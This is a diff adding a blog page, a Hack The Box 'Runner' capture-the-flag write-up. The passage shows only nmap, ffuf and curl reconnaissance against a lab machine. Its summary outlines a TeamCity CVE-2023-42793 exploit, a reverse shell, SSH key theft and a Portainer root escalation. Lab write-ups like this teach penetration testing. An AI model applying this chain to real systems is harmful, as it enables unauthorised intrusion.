@@ -1,0 +1,1874 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
+    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
+    crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+  <link rel="stylesheet" href="/assets/css/style.css?v=ee569fe6f2f6dd4f564ea1bf2ecd9164939b2731">
+  <link rel="stylesheet" href="/assets/css/prism.css">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
+  
+  <meta name="theme-color" content="#000000" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Runner writeup | Gabriel blog</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="HTB Runner writeup" />
+<meta name="author" content="gabri47" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Runner is a linux medium machine that teaches teamcity exploitation and portainer exploitation. First, I will abuse CVE-2023-42793 to have an admin token and have access to the teamcity’s API. I will use this API to create an user and have access to the admin panel to retrieve some info. Also, I will use this api to create a process that gives me a reverse shell to gain access as tcuser in a container. Then, I will see an id_rsa for john user and also a password for matthew in the hsql database of teamcity that is not useful by now. When I have access as john in runner machine, I can forward a portainer instance and reuse the matthew password seen before. From there, I will create a container with a mount of / that I will use to introduce my ssh pub key in root’s authorized_keys and gain access as root in runner." />
+<meta property="og:description" content="Runner is a linux medium machine that teaches teamcity exploitation and portainer exploitation. First, I will abuse CVE-2023-42793 to have an admin token and have access to the teamcity’s API. I will use this API to create an user and have access to the admin panel to retrieve some info. Also, I will use this api to create a process that gives me a reverse shell to gain access as tcuser in a container. Then, I will see an id_rsa for john user and also a password for matthew in the hsql database of teamcity that is not useful by now. When I have access as john in runner machine, I can forward a portainer instance and reuse the matthew password seen before. From there, I will create a container with a mount of / that I will use to introduce my ssh pub key in root’s authorized_keys and gain access as root in runner." />
+<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Runner.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Runner.html" />
+<meta property="og:site_name" content="Gabriel blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-08-24T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Runner writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-08-24T00:00:00+02:00","datePublished":"2024-08-24T00:00:00+02:00","description":"Runner is a linux medium machine that teaches teamcity exploitation and portainer exploitation. First, I will abuse CVE-2023-42793 to have an admin token and have access to the teamcity’s API. I will use this API to create an user and have access to the admin panel to retrieve some info. Also, I will use this api to create a process that gives me a reverse shell to gain access as tcuser in a container. Then, I will see an id_rsa for john user and also a password for matthew in the hsql database of teamcity that is not useful by now. When I have access as john in runner machine, I can forward a portainer instance and reuse the matthew password seen before. From there, I will create a container with a mount of / that I will use to introduce my ssh pub key in root’s authorized_keys and gain access as root in runner.","headline":"HTB Runner writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Runner.html"},"url":"http://localhost:4000/writeups/2024/HTB/Runner.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+<body>
+
+  <div id="header">
+    <div class="container">
+      <div class="title-container">
+        <a id="a-title" href="/">
+          <h1>Gabriel blog</h1>
+        </a>
+        <small class="nav-main d-flex justify-content-center">
+    
+    <a href="/writeups">Writeups</a>
+    
+     <span style="color: #b5e853;">|</span> 
+    
+    
+    <a href="/blog">Blog</a>
+    
+    
+</small>
+
+      </div>
+      <br>
+
+      
+      
+<nav class="navbar navlinks">
+    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
+        <span>HTB Writeups</span>
+        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
+    </button>
+
+    <div class="navbar-collapse collapse" id="navbarSupportedContent">
+        <div class="m-1 mt-2">
+
+            
+            
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Runner.html"> HTB Runner writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;teamcity/&gt; &lt;cve-2023-42793/&gt; &lt;teamcity-api/&gt; &lt;teamcity-rce/&gt; &lt;hsql/&gt; &lt;bcrypt/&gt; &lt;hash-cracking/&gt; &lt;id_rsa/&gt; &lt;portainer/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/FormulaX.html"> HTB FormulaX writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;websocket/&gt; &lt;simple-git-cve/&gt; &lt;CVE-2022-24066/&gt; &lt;mongodb/&gt; &lt;hash-cracking/&gt; &lt;librenms/&gt; &lt;librenms-abuse-template/&gt; &lt;laravel-blade/&gt; &lt;php/&gt; &lt;env-creds/&gt; &lt;sudoers/&gt; &lt;libreoffice-server-abuse/&gt; &lt;apache-uno-api/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Usage.html"> HTB Usage writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;sql-injection/&gt; &lt;boolean-based-sql-injection/&gt; &lt;hash-cracking/&gt; &lt;upload-vulnerabilities/&gt; &lt;monit/&gt; &lt;sudoers/&gt; &lt;abuse-symlinks/&gt; &lt;zip/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/IClean.html"> HTB IClean writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;ssti/&gt; &lt;sql/&gt; &lt;password-reuse/&gt; &lt;qpdf/&gt; &lt;sudoers/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/WifineticTwo.html"> HTB WifineticTwo writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;openplc/&gt; &lt;cve-2021-31630/&gt; &lt;wifi-scanning/&gt; &lt;pixiedust/&gt; &lt;port-scanning/&gt; &lt;ssh/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Headless.html"> HTB Headless writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;command-injection/&gt; &lt;sudoers/&gt; &lt;path-hijacking-.//&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Corporate.html"> HTB Corporate writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;bypass-csp/&gt; &lt;cookie-hijacking/&gt; &lt;idor/&gt; &lt;vpn/&gt; &lt;password-spraying/&gt; &lt;.mozilla-enumeration/&gt; &lt;bruteforce-bitwarden-pin/&gt; &lt;source-code-analysis/&gt; &lt;cookie-forging/&gt; &lt;jwt/&gt; &lt;docker-privesc/&gt; &lt;abupve/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Perfection.html"> HTB Perfection writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;ssti/&gt; &lt;ruby/&gt; &lt;crlf-injection/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;sudo-group/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Jab.html"> HTB Jab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Office.html"> HTB Office writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Crafty.html"> HTB Crafty writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Pov.html"> HTB Pov Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Analysis.html"> HTB Analysis Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Bizness.html"> HTB Bizness Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Ouija.html"> HTB Ouija Writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Monitored.html"> HTB Monitored Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Napper.html"> HTB Napper Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Surveillance.html"> HTB Surveillance writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Hospital.html"> HTB Hospital Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+
+            
+            
+            
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Codify.html"> HTB Codify Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+            </ul>
+
+            
+            
+
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+      
+      <div id="bottom-bar">
+        <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="content" class="container">
+    <section id="main_content">
+      <h5 class="mt-0 mb-2">
+        
+        
+          HTB
+        
+        
+      </h5>
+    
+      <h1 class="d-flex w-100 justify-content-between">
+        
+        
+          <span>HTB Runner writeup</span> <span class="points"> [30 pts] </span>
+        
+        
+      </h1>
+
+
+<script>
+
+</script>
+
+
+<p>Runner is a linux medium machine that teaches teamcity exploitation and portainer exploitation. First, I will abuse <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-42793">CVE-2023-42793</a> to have an admin token and have access to the teamcity’s API. I will use this API to create an user and have access to the admin panel to retrieve some info.  Also, I will use this api to create a process that gives me a reverse shell to gain access as tcuser in a container. Then, I will see an id_rsa for john user and also a password for matthew in the hsql database of teamcity that is not useful by now. When I have access as john in runner machine, I can forward a portainer instance and reuse the matthew password seen before. From there, I will create a container with a mount of / that I will use to introduce my ssh pub key in root’s authorized_keys and gain access as root in runner.</p>
+    
+      <h1 id="enumeration">
+        
+        
+          Enumeration <a href="#enumeration" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+    
+      <h2 id="port-scanning">
+        
+        
+          Port scanning <a href="#port-scanning" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h2>
+
+<p>I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>
+
+<pre><code class="language-python">❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.13 -oN tcpScan
+# Nmap 7.94SVN scan initiated Tue Aug 20 16:56:47 2024 as: nmap -sSVC --open -p- --min-rate 5000 -v -n -Pn -oN runner 10.10.11.13
+Nmap scan report for 10.10.11.13
+Host is up (0.32s latency).
+Not shown: 63434 closed tcp ports (reset), 2098 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp   open  http        nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://runner.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+8000/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Aug 20 16:57:21 2024 -- 1 IP address (1 host up) scanned in 33.79 seconds
+</code></pre>
+
+<ul>
+  <li>-sVC: Identifies service and version.</li>
+  <li>-p-: scans all the range of ports (1-65535).</li>
+  <li>–open: shows only open ports and not filtered or closed.</li>
+  <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
+  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a 
+real environment).</li>
+  <li>-n: Disables DNS resolution protocol.</li>
+  <li>-v: Enables verbose to see which ports are opened while it’s scanning</li>
+  <li>-Pn: Disables host discovery protocol (ping).</li>
+  <li>-oN tcpScan: Exports the evidence to a file named “tcpScan”.</li>
+</ul>
+
+<p>There are 3 ports:</p>
+
+<ul>
+  <li>Port 22: SSH</li>
+  <li>Port 80: HTTP, its a nginx 1.18.0 server and it redirects to runner.htb, so I will add this to my /etc/hosts:</li>
+</ul>
+
+<pre><code class="language-plaintext">10.10.11.13 runner.htb
+</code></pre>
+
+<ul>
+  <li>Port 8000: HTTP. It detects its Nagios NSCA but its probably a false positive because the port number</li>
+</ul>
+    
+      <h1 id="port-8000">
+        
+        
+          Port 8000 <a href="#port-8000" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+
+<p>This returns a 404 not found page:</p>
+
+<pre><code class="language-bash">❯ curl -sS -i http://10.10.11.13:8000
+HTTP/1.1 404 Not Found
+Date: Wed, 21 Aug 2024 09:45:58 GMT
+Content-Length: 9
+Content-Type: text/plain; charset=utf-8
+
+Not found
+</code></pre>
+
+<p>And fuzzing returns two pages, health and check:</p>
+
+<pre><code class="language-bash">❯ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://runner.htb:8000/FUZZ -mc all -fc 404
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://runner.htb:8000/FUZZ
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response status: 404
+________________________________________________
+
+health                  [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 323ms]
+version                 [Status: 200, Size: 9, Words: 1, Lines: 1, Duration: 324ms]
+:: Progress: [43007/43007] :: Job [1/1] :: 123 req/sec :: Duration: [0:05:54] :: Errors: 0 ::
+</code></pre>
+
+<p>Both doesn’t return nothing interesting. <code>/health</code> is probably to check if the server is up:</p>
+
+<pre><code class="language-bash">❯ curl -sS -i http://10.10.11.13:8000/health
+HTTP/1.1 200 OK
+Date: Wed, 21 Aug 2024 10:14:35 GMT
+Content-Length: 3
+Content-Type: text/plain; charset=utf-8
+
+OK
+❯ curl -sS -i -X POST -d 'data=data' http://10.10.11.13:8000/health
+HTTP/1.1 200 OK
+Date: Wed, 21 Aug 2024 10:14:53 GMT
+Content-Length: 3
+Content-Type: text/plain; charset=utf-8
+
+OK
+</code></pre>
+
+<p>And <code>/version</code> just returns a version string that doesn’t seem real:</p>
+
+<pre><code class="language-bash">❯ curl -sS -i http://10.10.11.13:8000/version
+HTTP/1.1 200 OK
+Date: Wed, 21 Aug 2024 10:16:41 GMT
+Content-Length: 9
+Content-Type: text/plain; charset=utf-8
+
+0.0.0-src
+❯ curl -sS -i http://10.10.11.13:8000/version -X POST -d 'data=data'
+HTTP/1.1 200 OK
+Date: Wed, 21 Aug 2024 10:17:04 GMT
+Content-Length: 9
+Content-Type: text/plain; charset=utf-8
+
+0.0.0-src
+</code></pre>
+
+<blockquote>
+  <p>Note: I tried POST method in case it was an API and it returns a different response but its not the case</p>
+</blockquote>
+
+<p>Let’s go for port 80</p>
+    
+      <h1 id="port-80">
+        
+        
+          Port 80 <a href="#port-80" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+
+<p>Taking a look with curl, I can’t see nothing that nmap hasn’t detected:</p>
+
+<pre><code class="language-bash">❯ curl -sS -i http://10.10.11.13
+HTTP/1.1 302 Moved Temporarily
+Server: nginx/1.18.0 (Ubuntu)
+Date: Tue, 20 Aug 2024 17:12:42 GMT
+Content-Type: text/html
+Content-Length: 154
+Connection: keep-alive
+Location: http://runner.htb/
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;302 Found&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;302 Found&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.18.0 (Ubuntu)&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>In the web I can see its just a landing page talking about a CI/CD:</p>
+
+<p><img src="/assets/images/Runner/runner-main-page.png" alt="runner main page"></p>
+    
+      <h2 id="subdomain-enumeration">
+        
+        
+          Subdomain enumeration <a href="#subdomain-enumeration" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h2>
+
+<p>Fuzzing subdomains using subdomains-top1million-5000.txt doesn’t discover nothing:</p>
+
+<pre><code class="language-bash">❯ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.runner.htb" -u http://runner.htb -fs 154 -mc all
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://runner.htb
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.runner.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 154
+________________________________________________
+
+:: Progress: [4989/4989] :: Job [1/1] :: 111 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
+</code></pre>
+
+<p>However, this machine is a bit tricky because I have to fuzz with another dictionary (/opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt). The first time I have done this machine, I tried that because I didn’t found anything in other place:</p>
+
